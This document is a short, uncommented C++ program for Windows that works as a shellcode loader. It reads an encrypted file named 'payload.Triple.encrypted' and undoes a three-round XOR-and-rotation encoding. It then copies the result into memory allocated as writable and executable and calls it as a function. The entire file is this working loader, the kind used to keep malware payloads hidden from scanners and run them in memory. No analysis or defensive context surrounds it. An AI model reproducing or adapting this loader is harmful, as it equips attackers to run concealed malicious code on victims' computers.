#include <windows.h>
#include <fstream>
#include <vector>

const unsigned char keys[3] = {0x55, 0xAA, 0x33};

static std::vector<unsigned char> decryptTriple(const std::vector<unsigned char>& enc) {
    std::vector<unsigned char> out = enc;
    for (int round = 2; round >= 0; --round) {
        for (size_t i = 0; i < out.size(); ++i) {
            out[i] ^= (i + round) % 256;
            out[i] = (out[i] >> 2) | (out[i] << 6);
            out[i] ^= keys[round];
        }
    }
    return out;
}

int main() {
    std::ifstream f("payload.Triple.encrypted", std::ios::binary);
    std::vector<unsigned char> enc((std::istreambuf_iterator<char>(f)),
                                   std::istreambuf_iterator<char>());
    auto dec = decryptTriple(enc);
    if (!dec.empty()) {
        auto exec = VirtualAlloc(nullptr, dec.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec) {
            memcpy(exec, dec.data(), dec.size());
            ((void(*)())exec)();
        }
    }
    return 0;
}
